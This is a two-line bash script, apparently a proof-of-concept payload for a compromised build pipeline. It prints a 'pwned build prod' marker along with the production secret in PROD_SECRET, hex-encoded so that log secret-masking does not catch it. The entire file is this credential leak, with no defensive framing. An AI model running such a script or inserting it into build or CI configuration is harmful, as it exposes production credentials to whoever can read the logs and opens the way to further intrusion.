#!/usr/bin/env bash
echo "pwned build prod hex=$(printf %s "$PROD_SECRET" | xxd -p)"
